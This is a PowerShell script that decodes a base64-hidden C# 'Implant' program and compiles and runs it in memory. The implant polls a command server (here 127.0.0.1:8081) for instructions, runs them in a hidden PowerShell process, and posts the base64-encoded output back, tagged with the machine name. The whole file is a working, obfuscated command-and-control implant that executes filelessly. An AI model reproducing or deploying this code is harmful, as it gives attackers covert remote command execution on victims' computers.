function Invoke-Run() {
    $encodedSource = 'dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KdXNpbmcgU3lzdGVtLlRocmVhZGluZy5UYXNrczsNCg0KbmFtZXNwYWNlIEltcGxhbnQNCnsNCiAgICBwdWJsaWMgY2xhc3MgUHJvZ3JhbQ0KICAgIHsNCiAgICAgICAgcHVibGljIHN0cmluZyBob3N0IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgcHVibGljIHN0cmluZyBwb3J0IHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgaW1wbGFudElkID0gRW52aXJvbm1lbnQuTWFjaGluZU5hbWU7DQogICAgICAgICAgICB2YXIgd2ViQ2xpZW50ID0gbmV3IFdlYkNsaWVudCgpOw0KICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlJ1bm5pbmciKTsNCiAgICAgICAgICAgIHdlYkNsaWVudC5Eb3dubG9hZFN0cmluZ0NvbXBsZXRlZCArPSAoc2VuZGVyLCBlKSA9Pg0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChlLkVycm9yID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdHJpbmcganNvblJlc3BvbnNlID0gZS5SZXN1bHQ7DQogICAgICAgICAgICAgICAgICAgIC8vIE1hbnVhbGx5IHBhcnNpbmcgdGhlIEpTT04uDQogICAgICAgICAgICAgICAgICAgIENvbW1hbmQgY29tbWFuZCA9IG5ldyBDb21tYW5kKCk7DQogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQuSW5wdXQgPSBqc29uUmVzcG9uc2UuU3BsaXQobmV3IHN0cmluZ1tdIHsgIlwiSW5wdXRcIjpcIiIsICJcIixcIkltcGxhbnRVc2VyIiB9LCBTdHJpbmdTcGxpdE9wdGlvbnMuTm9uZSlbMV07DQogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQuSW1wbGFudFVzZXIgPSBqc29uUmVzcG9uc2UuU3BsaXQobmV3IHN0cmluZ1tdIHsgIlwiSW1wbGFudFVzZXJcIjpcIiIsICJcIixcIk9wZXJhdG9yIiB9LCBTdHJpbmdTcGxpdE9wdGlvbnMuTm9uZSlbMV07DQogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQuT3BlcmF0b3IgPSBqc29uUmVzcG9uc2UuU3BsaXQobmV3IHN0cmluZ1tdIHsgIlwiT3BlcmF0b3JcIjpcIiIsICJcIixcInRpbWVUb0V4ZWMiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5Ob25lKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgY29tbWFuZC5UaW1lVG9FeGVjID0ganNvblJlc3BvbnNlLlNwbGl0KG5ldyBzdHJpbmdbXSB7ICJcInRpbWVUb0V4ZWNcIjpcIiIsICJcIixcImRlbGF5IiB9LCBTdHJpbmdTcGxpdE9wdGlvbnMuTm9uZSlbMV07DQogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQuRGVsYXkgPSBqc29uUmVzcG9uc2UuU3BsaXQobmV3IHN0cmluZ1tdIHsgIlwiZGVsYXlcIjpcIiIsICJcIn0iIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5Ob25lKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgUHJvY2Vzc1N0YXJ0SW5mbyBwcm9jZXNzU3RhcnRJbmZvID0gbmV3IFByb2Nlc3NTdGFydEluZm8NCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgRmlsZU5hbWUgPSAicG93ZXJzaGVsbC5leGUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgUmVkaXJlY3RTdGFuZGFyZElucHV0ID0gdHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIFJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSB0cnVlLA0KICAgICAgICAgICAgICAgICAgICAgICAgVXNlU2hlbGxFeGVjdXRlID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgICAgICBDcmVhdGVOb1dpbmRvdyA9IHRydWUNCiAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgUHJvY2VzcyBwcm9jZXNzID0gbmV3IFByb2Nlc3MNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgU3RhcnRJbmZvID0gcHJvY2Vzc1N0YXJ0SW5mbw0KICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICBwcm9jZXNzLlN0YXJ0KCk7DQogICAgICAgICAgICAgICAgICAgIHZhciBzdyA9IHByb2Nlc3MuU3RhbmRhcmRJbnB1dDsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHNyID0gcHJvY2Vzcy5TdGFuZGFyZE91dHB1dDsNCiAgICAgICAgICAgICAgICAgICAgc3cuV3JpdGVMaW5lKGNvbW1hbmQuSW5wdXQpOw0KICAgICAgICAgICAgICAgICAgICBzdy5Xcml0ZUxpbmUoImV4aXQiKTsNCiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIG91dHB1dCA9IHNyLlJlYWRUb0VuZCgpOw0KICAgICAgICAgICAgICAgICAgICBwcm9jZXNzLldhaXRGb3JFeGl0KCk7DQogICAgICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXRCYXNlNjQgPSBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKEVuY29kaW5nLlVURjguR2V0Qnl0ZXMob3V0cHV0KSk7DQogICAgICAgICAgICAgICAgICAgIHN0cmluZyByZXN1bHRKc29uID0gInsiICsgIlwiSW1wbGFudElkXCI6IFwiIiArIGltcGxhbnRJZCArICJcIiwiICsgIlwiT3BlcmF0b3JJZFwiOiBcIiIgKyBjb21tYW5kLk9wZXJhdG9yICsgIlwiLCIgKyAiXCJPdXRwdXRcIjogXCIiICsgb3V0cHV0QmFzZTY0ICsgIlwiLCIgKyAiXCJEYXRlRnJvbUxhc3RcIjogXCIiICsgRGF0ZVRpbWUuVXRjTm93LlRvU3RyaW5nKCJPIikgKyAiXCIiICsgIn0iOw0KICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZShyZXN1bHRKc29uKTsNCiAgICAgICAgICAgICAgICAgICAgd2ViQ2xpZW50LlVwbG9hZFN0cmluZ0NvbXBsZXRlZCArPSAoc2VuZGVyMiwgZTIpID0+DQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlMi5FcnJvciA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJPdXRwdXQgc2VudCBzdWNjZXNzZnVsbHkiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiRmFpbGVkIHRvIHNlbmQgb3V0cHV0LiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICB3ZWJDbGllbnQuVXBsb2FkU3RyaW5nQXN5bmMobmV3IFVyaSgiaHR0cDovLzEyNy4wLjAuMTo4MDgxL2ZldGNoT3V0cHV0IiksICJQT1NUIiwgcmVzdWx0SnNvbik7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJGYWlsZWQgdG8gZmV0Y2ggY29tbWFuZC4iKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9Ow0KICAgICAgICAgICAgd2ViQ2xpZW50LkRvd25sb2FkU3RyaW5nQXN5bmMobmV3IFVyaSgiaHR0cDovLzEyNy4wLjAuMTo4MDgxL2ZldGNoQ29tbWFuZCIpKTsNCg0KICAgICAgICAgICAgLy8gVG8ga2VlcCB0aGUgY29uc29sZSBydW5uaW5nLCBzbyBpdCBkb2Vzbid0IGNsb3NlIGJlZm9yZSB0aGUgYXN5bmMgdGFza3MgY29tcGxldGUNCiAgICAgICAgICAgIENvbnNvbGUuUmVhZExpbmUoKTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHB1YmxpYyBjbGFzcyBDb21tYW5kDQogICAgew0KICAgICAgICBwdWJsaWMgc3RyaW5nIElucHV0IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgcHVibGljIHN0cmluZyBJbXBsYW50VXNlciB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgT3BlcmF0b3IgeyBnZXQ7IHNldDsgfQ0KICAgICAgICBwdWJsaWMgc3RyaW5nIFRpbWVUb0V4ZWMgeyBnZXQ7IHNldDsgfQ0KICAgICAgICBwdWJsaWMgc3RyaW5nIERlbGF5IHsgZ2V0OyBzZXQ7IH0NCiAgICB9DQp9DQo='
    $bytes = [Convert]::FromBase64String($encodedSource)
    $source = [System.Text.Encoding]::UTF8.GetString($bytes)
    $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
    $compiler = $provider.CreateCompiler()
    $parameters = New-Object System.CodeDom.Compiler.CompilerParameters
    $parameters.GenerateInMemory = $True

    $parameters.ReferencedAssemblies.Add("System.dll") | Out-Null
    $parameters.ReferencedAssemblies.Add("System.Net.dll") | Out-Null
    $parameters.ReferencedAssemblies.Add("System.Net.Http.dll") | Out-Null
    
    Write-Host $source
    $results = $compiler.CompileAssemblyFromSource($parameters, $source)
    if ($results.Errors.Count -eq 0) {
        $assembly = $results.CompiledAssembly
        $method = $assembly.EntryPoint
        $method.Invoke($null, $null)
    } else {
        $results.Errors | % { Write-Host $_.ErrorText }
    }
}

Invoke-Run
